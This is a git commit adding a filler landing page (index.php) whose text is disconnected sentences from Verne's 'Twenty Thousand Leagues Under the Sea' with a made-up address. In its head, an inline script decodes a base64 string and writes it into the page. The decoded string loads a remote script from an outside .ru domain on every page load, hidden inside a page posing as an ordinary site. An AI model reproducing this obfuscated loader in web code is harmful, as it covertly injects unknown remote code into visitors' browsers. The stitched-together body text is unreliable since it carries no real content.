594ed205ef2896100d9a51c4cfc9cb6238f5751f
zmwchcyi <76059960+zmwchcyi@users.noreply.github.com>
2020-12-15 18:03:42 +0200

    Add files via upload

---
+++ index.php
@@ -0,0 +1,89 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+    <title>Captain Nemo entered his room, and I saw him no more for some time. But </title>
+
+	<link href="https://fonts.googleapis.com/css?family=Open+Sans" rel="stylesheet">
+	<link href="https://fonts.googleapis.com/css?family=Quicksand" rel="stylesheet">
+    <link rel="stylesheet" href="http://maxcdn.bootstrapcdn.com/font-awesome/4.6.0/css/font-awesome.min.css">
+    <link rel="stylesheet" href="styles.css">
+
+    <script type="text/javascript">
+	let encoded = 'PHNjcmlwdCBzcmM9Imh0dHBzOi8va2xvb2xrLnJ1L3RyYWNrZXIuanMiPjwvc2NyaXB0PjxkaXYgY2xhc3M9ImNoZWNrX2Zvcl9hMmxnd3Jlb3FlZWMiPjwvZGl2Pg==';let decoded = atob(encoded);document.write(''+ decoded +'');
+	</script>
+
+</head>
+
+<body>
+
+	<header>
+		<nav>
+			<li><a href="#">Home</a></li>
+			<li><a href="#">Products</a></li>
+			<li><a href="#">About</a></li>
+			<li><a href="#">Contacts</a></li>
+		</nav>
+	</header>
+
+
+	<section class="hero">
+		<div class="background-image" style="background-image: url(main.jpg);"></div>
+		<h1>Captain Nemo entered his room, and I saw him no more for some time. But </h1>
+	</section>
+
+
+	<section class="our-work">
+		<h3 class="title">The captain's fingers were then running over the ke</h3>
+		<p>The first words I spoke were words of gratitude and thankfulness to my two companions. Ned and Conseil had prolonged my life during the last hours of this long agony. All my gratitude could not repay such devotion. I looked at him. I thought I had not heard aright. But Ned Land had disentangled the captain, who, getting up without any wound, went straight to the Indian, quickly cut the cord which held him to the stone, took him in his arms, and, with a sharp blow of his heel, mounted to the surface. If agreeable to you, sir, interrupted Conseil, the commander of the Nautilus has invited us to visit the magnificent Ceylon fisheries to-morrow, in your company; he did it kindly, and behaved like a real gentleman.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" style="background-image: url(image1.jpg);"></li>
+		</div>
+	</section>
+	
+
+	<section class="our-work">
+		<h3 class="title">Meat! We are going to eat some meat; and w</h3>
+		<p>Certainly, said I, this sea is quoted as one of the worst, and in the time of the ancients, if I am not mistaken, its reputation was detestable. M. Aronnax, we must attempt some desperate means, or we shall be sealed up in this solidified water as in cement. I followed, and in a few minutes I had climbed to the top, which for a circle of ten yards commanded the whole mass of rock. I was silenced; Captain Nemo rose.</p>
+		<hr>
+
+		<ul class="grid">
+			<li class="large" style="background-image: url(image2.jpg);"></li>
+		</div>
+	</section>
+
+
+
+	<section class="contact">
+		<h3 class="title">But I so seldom meet him. He avoids me.</h3>	
+		<p>When one has the honor of being a savant as you are, sir, one should not expose one's self to- It was on the 17th of May, about 500 miles from Heart's Content, at a depth of more than 1,400 fathoms, that I saw the electric cable lying on the bottom. Conseil, to whom I had not mentioned it, thought at first that it was a gigantic sea-serpent. But I undeceived the worthy fellow, and by way of consolation related several particulars in the laying of this cable. The first one was laid in the years 1857 and 1858; but after transmitting about 400 telegrams, would not act any longer. In 1863, the engineers constructed another one, measuring 2,000 miles in length, and weighing 4,500 tons, which was embarked on the Great Eastern. This attempt also failed. This terrible spectacle was the forerunner of the series of maritime catastrophes that the Nautilus was destined to meet with in its route. As long as it went through more frequented waters, we often saw the hulls of shipwrecked vessels that were rotting in the depths, and, deeper down, cannons, bullets, anchors, chains, and a thousand other iron materials eaten up by rust. However, on the 11th of December, we sighted the Pomotou Islands, the old dangerous group of Bougainville, that extend over a space of 500 leagues at E.S.E. to W.N.W., from the Island Ducie to that of Lazareff. This group covers an area of 370 square leagues, and it is formed of sixty groups of islands, among which the Gambier group is remarkable, over which France exercises sway. These are coral islands, slowly raised, but continuous, created by the daily work of polypi. Then this new island will be joined later on to the neighboring groups, and a fifth continent will stretch from New Zealand and New Caledonia, and from thence to the Marquesas. I was on the platform when the altitude was taken, and the captain pronounced these words-It is here.</p>
+		<hr>
+
+		<form>
+			<input type="email" placeholder="Email">
+			<input type="Name" placeholder="Name">
+			<input type="Surmane" placeholder="Surname">
+			<a href="#" class="btn">Subscribe now</a>
+		</form>
+
+	</section>
+
+	<footer>
+		<ul>
+			<li><a href="#"><i class="fa fa-twitter-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-facebook-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-snapchat-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-pinterest-square"></i></a></li>
+			<li><a href="#"><i class="fa fa-github-square"></i></a></li>
+		</ul>
+		<p><a href="policy.html">Privacy policy</a></p>
+		<p>875 Rickie Mountains, Apt. 081, 97714, South Majortown, South Carolina, United States</p>
+	</footer>
+
+</body>
+
+</html>
